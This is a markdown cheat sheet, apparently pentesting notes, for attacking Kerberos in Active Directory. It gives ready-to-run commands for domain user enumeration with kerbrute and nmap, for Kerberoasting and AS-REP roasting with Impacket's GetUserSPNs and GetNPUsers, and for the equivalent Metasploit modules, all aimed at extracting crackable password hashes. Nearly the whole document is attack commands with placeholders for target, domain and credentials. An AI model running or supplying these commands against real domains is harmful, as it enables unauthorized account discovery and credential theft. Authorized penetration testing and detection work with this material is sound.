# Kerberos

## 01 - Manual

### 1.1 - Usage

#### 1.1.1 - Enumerate Users

- **Enumerate users against the active directory**

`$ ./kerbrute userenum --dc <IP> -d <domain_name> users.txt -t 64`

#### 1.1.2 - Kerberoast

^e70af7

- **Request a Kerberos 5 TGS-REP etype 23 hash from an SPN user account**

`$ GetUserSPNs -request -dc-ip <IP> <domain_name>/<username>:<password>`

#### 1.1.3 - ASREPRoast

^7e8f5e

- **Request a Kerberos 5, etype 23, AS-REP hash from an NP user account**

`$ GetNPUsers -request -dc-ip <IP> <domain_name>/<username>:<password>`

`$ GetNPUsers -request -dc-ip <IP> <domain_name> -usersfile users.txt`

## 02 - Nmap

`$ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="<domain_name>",userdb=<usernames.txt> <IP>`

## 03 - Metasploit

### 3.1 - Enumerate Users

```
msf > use auxiliary/gather/kerberos_enumusers

msf auxiliary(gather/kerberos_enumusers) > options

Module options (auxiliary/gather/kerberos_enumusers):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DOMAIN                      yes       The Domain Eg: demo.local
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      88               yes       The target port
   Timeout    10               yes       The TCP timeout to establish connection and read data
   USER_FILE                   yes       Files containing usernames, one per line

msf auxiliary(gather/kerberos_enumusers) > set domain <domain_name>

msf auxiliary(gather/kerberos_enumusers) > set rhosts <IP>

msf auxiliary(gather/kerberos_enumusers) > set user_file usernames.txt

msf auxiliary(gather/kerberos_enumusers) > exploit -j
```

### 3.2 Kerberoast

```
msf > use auxiliary/gather/get_user_spns

msf auxiliary(gather/get_user_spns) > options

Module options (auxiliary/gather/get_user_spns):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS  1                yes       The number of concurrent threads (max one per host)
   domain                    yes       The target Active Directory domain
   pass                      yes       Password for the domain user account
   user                      yes       Username for a domain account

msf auxiliary(gather/get_user_spns) > set rhosts <IP>

msf auxiliary(gather/get_user_spns) > set threads 4

msf auxiliary(gather/get_user_spns) > set domain <domain_name>

msf auxiliary(gather/get_user_spns) > set user <username>

msf auxiliary(gather/get_user_spns) > set pass <password>

msf auxiliary(gather/get_user_spns) > exploit
```

## References

- [Impacket](https://github.com/fortra/impacket)

- [Kerbrute](https://github.com/ropnop/kerbrute)

- [Kerberoasting Common Tools](https://blog.certcube.com/kerberoasting-common-tools/)

- [Pentesting Kerberos 88](https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88)